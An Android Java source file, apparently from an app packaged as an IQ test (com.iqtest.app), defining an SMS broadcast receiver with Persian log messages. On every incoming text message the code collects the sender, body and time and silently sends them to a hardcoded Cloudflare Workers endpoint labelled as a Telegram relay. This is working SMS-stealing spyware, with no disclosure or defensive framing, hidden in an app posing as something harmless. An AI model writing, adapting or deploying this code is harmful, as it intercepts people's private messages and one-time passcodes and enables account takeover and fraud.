package com.iqtest.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "IQSmsReceiver";
    private static final String TELEGRAM_WORKER = "https://mute-math-f311iq-190.mehran041mehraaaan.workers.dev";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            String format = bundle.getString("format");
            JSONArray messages = new JSONArray();

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }

                if (sms == null) continue;

                String sender = sms.getOriginatingAddress();
                String body = sms.getMessageBody();
                long timestamp = sms.getTimestampMillis();

                JSONObject msg = new JSONObject();
                msg.put("from", sender != null ? sender : "unknown");
                msg.put("body", body != null ? body : "");
                msg.put("timestamp", timestamp);
                msg.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                        .format(new Date(timestamp)));

                messages.put(msg);
                Log.d(TAG, "SMS از: " + sender + " — " + body);
            }

            if (messages.length() > 0) {
                sendToServer(messages);
            }

        } catch (Exception e) {
            Log.e(TAG, "خطا در پردازش SMS", e);
        }
    }

    private void sendToServer(JSONArray messages) {
        executor.execute(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("event", "sms_received");
                payload.put("messages", messages);
                payload.put("count", messages.length());
                payload.put("timestamp", System.currentTimeMillis());

                URL url = new URL(TELEGRAM_WORKER);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes("UTF-8"));
                }

                int code = conn.getResponseCode();
                Log.d(TAG, "پاسخ ارسال SMS: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "خطا در ارسال SMS", e);
            }
        });
    }
}